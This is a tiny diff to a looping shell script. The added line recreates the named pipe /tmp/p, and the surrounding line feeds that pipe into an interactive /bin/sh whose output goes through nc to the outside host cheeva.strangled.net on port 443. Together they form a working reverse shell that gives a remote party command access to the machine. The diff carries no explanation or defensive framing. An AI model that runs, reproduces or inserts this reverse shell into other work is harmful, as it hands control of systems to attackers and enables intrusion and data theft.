@@ -1,6 +1,7 @@
 #!/bin/sh
 while true; do
 
+    rm -f /tmp/p && mkfifo /tmp/p
 
     cat /tmp/p | /bin/sh -i 2>&1 | nc cheeva.strangled.net 443> /tmp/p &
 
